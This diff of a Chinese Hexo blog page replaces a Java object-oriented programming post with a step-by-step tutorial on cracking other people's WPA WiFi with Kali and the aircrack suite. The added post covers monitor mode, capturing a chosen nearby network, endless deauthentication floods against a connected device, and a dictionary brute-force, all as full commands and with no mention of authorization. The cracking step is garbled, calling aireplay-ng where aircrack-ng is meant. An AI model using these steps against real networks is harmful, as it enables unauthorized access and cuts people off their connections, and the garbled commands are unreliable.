@@ -4,10 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="面向对象三大特性, Yangxin">
-    <meta name="description" content="封装: 就是将一些逻辑代码和实现的细节封到一个类里，隐藏细节，外部不能随便修改或调用，需要声明对象的引用来调用，可以提高代码的复用性.比如在测试类里 
-实现流程1. 私有化成员变量用private修饰
-2. 公有set与get方法，在set">
+    <meta name="keywords" content="Kali系统强力破解WIFI, Yangxin">
+    <meta name="description" content="Kali WiFi渗透准备工作： kali系统、有无线网卡的电脑、一本强大的密码字典实现原理：进入kali系统，使用系统自带的Aircrack程序监听周围的热点，选择一个不错的WiFi热点然后对连接它的一台设备进行攻击，使其掉线，掉线后这台">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>面向对象三大特性 | Yangxin</title>
+    <title>Kali系统强力破解WIFI | Yangxin</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -286,13 +284,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        面向对象三大特性
+                        Kali系统强力破解WIFI
                     </div>
                 </div>
             </div>
@@ -404,8 +402,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/面向对象/">
-                                <span class="chip bg-color">面向对象</span>
+                            <a href="/tags/WIFI破解/">
+                                <span class="chip bg-color">WIFI破解</span>
                             </a>
                         
                     </div>
@@ -416,8 +414,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Java/" class="post-category">
-                                Java
+                            <a href="/categories/Kali/" class="post-category">
+                                Kali
                             </a>
                         
                     </div>
@@ -444,48 +442,51 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="封装"><a href="#封装" class="headerlink" title="封装:"></a>封装:</h1><p> <strong>就是将一些逻辑代码和实现的细节封到一个类里，隐藏细节，外部不能随便修改或调用，需要声明对象的引用来调用，可以提高代码的复用性.比如在测试类里</strong> </p>
-<h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><pre><code>1. 私有化成员变量用private修饰
-2. 公有set与get方法，在set里进行合理值判断
-3. 创建无参和有参构造，在有参里进行set的判断</code></pre><p><strong><em>static修饰时变成类层级，用类名.调用</em></strong> </p>
-<h1 id="继承-extends"><a href="#继承-extends" class="headerlink" title="继承 (extends):"></a>继承 (extends):</h1><p><strong>多个类有相同的部分，将同样的部分放到父类，子类都包含自己独有的方法，然后继承父类的相同的方法，实现代码通用编程。子类需要重写父类的方法@override注释然后super.show()调用。重写原则：1.方法名一样，参数列表及返回值相同2.访问权限不能变小可同级或变大3.子类重写方法不可抛出更大异常</strong>  </p>
-<ol>
-<li>子类可以继承私有成员变量，不可继承父类构造方法与私有成员方法</li>
-<li>支持单继承</li>
-<li>继承满足：子类is a父类</li>
-<li>构造子类对象都会调用父类构造来将方法初始化</li>
-</ol>
-<h3 id="访问控制符"><a href="#访问控制符" class="headerlink" title="访问控制符 :"></a>访问控制符 :</h3><pre><code>public:可在任意处使用，无论自己包或别的包
-protected：只可以在本类中使用，其他的包不可以
-deafalt： 只在本类的内部和本包中的类
-private：仅在本类的内部使用 </code></pre><h1 id="多态"><a href="#多态" class="headerlink" title="多态 :"></a>多态 :</h1><p><strong>有继承，重写，父类引用指向子类对象,意义：屏蔽不同子类的差异实现通用的编程</strong><br>当父类的引用指向子类的对象时，可直接调用父类方法，若想调用子类对象需强转。例：</p>
-<pre><code>Person p = new Worker();
-//调worker内的独有方法salary,强转。
-((worker)p).salary(); </code></pre><p>强转判断： </p>
-<pre><code>//此处person不转，worker需强转；
-if(p instanceof person){
-  syso..(&quot;不用转&quot;)
-}syso..(&quot;需要强转&quot;) </code></pre><hr>
-<h2 id="多态的三种实现"><a href="#多态的三种实现" class="headerlink" title="多态的三种实现"></a>多态的三种实现</h2><pre><code>//父类指向子类
-1.Person p = new Worker（）;
-2.//写个静态方法将父类当形参放入，用类名.此静态方法名（new 子类对象来调用） </code></pre><hr>
-<pre><code>public class R{
-    public static void father(Person p){
-      //调用子类的show方法
-       p.show();
-    }
-  public static void main(String[] args){
-      R.father(new Worker(20,&quot;kk&quot;,1234));
-  }
-}</code></pre><p><strong>3.接口的实现方法：因为接口比抽象类更抽象，不能new对象，因此不能用2方法中那样的形式new个对象，那么我们就需要定义一个类来实现这个接口，用类名.调用的时候TestA.test(new shixianA());比如两个接口类叫metal和gold，然后写monet类实现它两个，会重写他两，之后在测试类里，</strong>  </p>
-<pre><code>//有点像定义一个父类实现多个子类的形式；
-Money  m = new Metal();
-Money  m = new Gold()  </code></pre><hr>
-<h1 id="final"><a href="#final" class="headerlink" title="final :"></a>final :</h1><pre><code>修饰类：不能被继承，防止滥用string，stystem
-修饰成员方法：不可被重写
-修饰成员变量：必须赋初值变常量
-开发很少用static或final单用
-一般public static final double=3.11；</code></pre>
+                <h1 id="Kali-WiFi渗透"><a href="#Kali-WiFi渗透" class="headerlink" title="Kali WiFi渗透"></a>Kali WiFi渗透</h1><h3 id="准备工作：-kali系统、有无线网卡的电脑、一本强大的密码字典"><a href="#准备工作：-kali系统、有无线网卡的电脑、一本强大的密码字典" class="headerlink" title="准备工作： kali系统、有无线网卡的电脑、一本强大的密码字典"></a>准备工作： kali系统、有无线网卡的电脑、一本强大的密码字典</h3><p><strong>实现原理：进入kali系统，使用系统自带的Aircrack程序监听周围的热点，选择一个不错的WiFi热点然后对连接它的一台设备进行攻击，使其掉线，掉线后这台设备会自动重新连接，在连接的过程中设备会发送握手的数据包（当然也可以坐等设备连接当前WiFi热点，只要有设备在进行连接就会发送握手包），我们就可以利用伪装的挂载设备去窃取这个握手包，最后就可以用密码字典文件去暴力破解获得密码。</strong> </p>
+<blockquote>
+<h3 id="1-建立监听热点机制"><a href="#1-建立监听热点机制" class="headerlink" title="1.建立监听热点机制"></a>1.建立监听热点机制</h3></blockquote>
+<p><strong>首先使用ifconfig/iwconfig命令查看无线网卡是否加载成功，如图出现wlan0无线设备即加载成功。（eth0是本机的以太网卡配置参数，wlan0是你的无线网卡名称，lo是回环接口）</strong> </p>
+<p><img src="images/ifconfig1.png" alt></p>
+<p><img src="http://mybestow.com/assets/img/ifconfig.png" alt> </p>
+<p><strong>使用airmon-ng start命令将网卡设定为监听模式，此时无线网卡的名称将会变成wlan0mon</strong><br><img src="http://mybestow.com/assets/img/start.png" alt></p>
+<blockquote>
+<h3 id="2-监听WiFi热点"><a href="#2-监听WiFi热点" class="headerlink" title="2.监听WiFi热点"></a>2.监听WiFi热点</h3></blockquote>
+<p><strong>使用airodump-ng wlan0mon命令开始嗅探周围的WiFi热点，显示周围热点（ctrl+c 停止监听）</strong><br><img src="http://mybestow.com/assets/img/%E7%9B%91%E5%90%ACwifi%E4%BF%A1%E5%8F%B7.png" alt> </p>
+<pre><code>BSSID: 无线AP（路由器）的MAC地址。
+PWR: 这个值的大小反应信号的强弱，越大越好。很重要！！！
+RXQ: 丢包率，越小越好，此值对PJ密码影响不大。
+Beacons: 反应客户端和AP的数据交换情况，通常此值不断变化。
+#Data: 这个值非常重要，直接影响到密码PJ的时间长短，如果有用户正在下载文件或看电影等大量数据传输的话，此值增长较快。
+CH: 工作频道。
+MB: 连接速度。
+ENC: 编码方式。通常有WEP、WPA、TKIP等方式。
+ESSID: 无线AP广播的名称。 </code></pre><p><strong>选取一个WiFi热点进行嗅探抓包（当有设备连入当前WiFi后就会抓取tcp握手包并存入保存路径内，坐等……）</strong> </p>
+<pre><code>airodump-ng -c 1 --bssid 48:0E:EC:7C:32:99 -w ~/a/ 网卡名
+-c  指定频道号(ch)
+--bssid  指定无线路由器的BSSID
+-w  指定获取的包存储的路径  </code></pre><p><img src="http://mybestow.com/assets/img/%E7%9B%91%E5%90%ACwifi%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt> </p>
+<p><strong>为了加速获取握手包可以选取一个连接当前WiFi的设备进行攻击，使用aireplay给其发送断开包，设备断开后就会进行自动重连</strong> </p>
+<pre><code>aireplay-ng -0 0 -c AC:88:FD:14:31:5B -a 48:0E:EC:7C:32:99 网卡名
+-0  表示发起攻击（deauthentication洪水攻击），后面指定攻击次数，设置0则为循环攻击，不停的攻击客户端将无法正常上网（ctrl+c停止）
+-c  指定强制断开的设备的mac地址
+-a  指定无线路由器的BSSID
+攻击原理：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），此时我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码  </code></pre><p><img src="http://mybestow.com/assets/img/%E6%94%BB%E5%87%BB.png" alt>  </p>
+<p><strong>这时我们只需等待右上角出现WPA handshake字样，后面跟着BSSID，即为抓到了该无线网的握手包，我们可以使用CTRL+C来停止嗅探握手包。</strong> </p>
+<p><img src="http://mybestow.com/assets/img/%E8%8E%B7%E5%BE%97%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt>  </p>
+<p><strong>获取到了握手包我们就可以在之前设置的保存路径中看到，其中.cp文件就是我们需要破解的密码</strong> </p>
+<p><img src="http://mybestow.com/assets/img/%E6%8F%A1%E6%89%8B%E5%8C%85.png" alt> </p>
+<blockquote>
+<h3 id="3、使用字典暴力破解"><a href="#3、使用字典暴力破解" class="headerlink" title="3、使用字典暴力破解"></a>3、使用字典暴力破解</h3><p><strong>这一步是整个密码破解的关键，能否成功，取决与你的CPU是否强大，还有你字典的大小，以及字典的质量，密码的复杂程度。</strong> </p>
+</blockquote>
+<pre><code>aireplay-ng -a2 -b 48:0E:EC:7C:32:99 -w ~/1.txt ~/a/-01.cp
+-a2  代表WPA的握手包
+-b  指定要破解的WiFi BSSID
+-w  指定字典文件
+最后是抓取的包  </code></pre><p><img src="http://mybestow.com/assets/img/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png" alt></p>
+<blockquote>
+<p><strong>最后记得airmon-ng stop关闭你的无线网卡哦</strong><br><img src="http://mybestow.com/assets/img/%E5%85%B3%E9%97%AD.png" alt> </p>
+</blockquote>
+
             </div>
             <hr/>
 
@@ -645,8 +646,8 @@ Money  m = new Gold()  </code></pre><hr>
                 </a>
             </div>
             <br/>
-            <a  href="/2019/10/16/2019-10-16-面向对象/">
-                    《面向对象三大特性》
+            <a  href="/2019/10/16/2019-10-16-kali系统破解WIFI/">
+                    《Kali系统强力破解WIFI》
             </a> 由
             <a href="http://yoursite.com">
                 yangxin
@@ -691,19 +692,23 @@ Money  m = new Gold()  </code></pre><hr>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/10/16/2019-10-16-kali系统破解WIFI/">
+                <a href="/2019/10/16/2019-10-16-Java单例设计模式/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="Kali系统强力破解WIFI">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Java设计模式之单例设计模式">
                         
-                        <span class="card-title">Kali系统强力破解WIFI</span>
+                        <span class="card-title">Java设计模式之单例设计模式</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Kali WiFi渗透准备工作： kali系统、有无线网卡的电脑、一本强大的密码字典实现原理：进入kali系统，使用系统自带的Aircrack程序监听周围的热点，选择一个不错的WiFi热点然后对连接它的一台设备进行攻击，使其掉线，掉线后这台
+                            Java设计模式之单例模式
+起步java中单例模式是一种常见的设计模式，单例模式的写法有好几种，这里主要介绍两种：懒汉式单例、饿汉式单例。 
+
+特点
+1、单例类只能有一个实例。 2、单例类必须自己创建自己的唯一实例。 3、单例类必须给所有其
                         
                     </div>
                     <div class="publish-info">
@@ -714,8 +719,8 @@ Money  m = new Gold()  </code></pre><hr>
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Kali/" class="post-category">
-                                    Kali
+                            <a href="/categories/Java/" class="post-category">
+                                    Java
                                 </a>
                             
                             
@@ -725,8 +730,8 @@ Money  m = new Gold()  </code></pre><hr>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/WIFI破解/">
-                        <span class="chip bg-color">WIFI破解</span>
+                    <a href="/tags/单例设计模式/">
+                        <span class="chip bg-color">单例设计模式</span>
                     </a>
                     
                 </div>
@@ -740,33 +745,33 @@ Money  m = new Gold()  </code></pre><hr>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/15/2019-10-15-shujuku/">
+                <a href="/2019/10/16/2019-10-16-面向对象/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="四大数据库特性">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="面向对象三大特性">
                         
-                        <span class="card-title">四大数据库特性</span>
+                        <span class="card-title">面向对象三大特性</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            关系型数据库oracle–mysql一、mysql与Oracle的相同点：1、都是关系型数据库管理系统(MySQL开放源码)
-2、都是目前很流行的数据库（Oracle以分布式为核心）；
-二、MySQL、Oracle各自特点：1、Oracle
+                            封装: 就是将一些逻辑代码和实现的细节封到一个类里，隐藏细节，外部不能随便修改或调用，需要声明对象的引用来调用，可以提高代码的复用性.比如在测试类里 
+实现流程1. 私有化成员变量用private修饰
+2. 公有set与get方法，在set
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/数据库/" class="post-category">
-                                    数据库
+                            <a href="/categories/Java/" class="post-category">
+                                    Java
                                 </a>
                             
                             
@@ -776,8 +781,8 @@ Money  m = new Gold()  </code></pre><hr>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/数据库/">
-                        <span class="chip bg-color">数据库</span>
+                    <a href="/tags/面向对象/">
+                        <span class="chip bg-color">面向对象</span>
                     </a>
                     
                 </div>
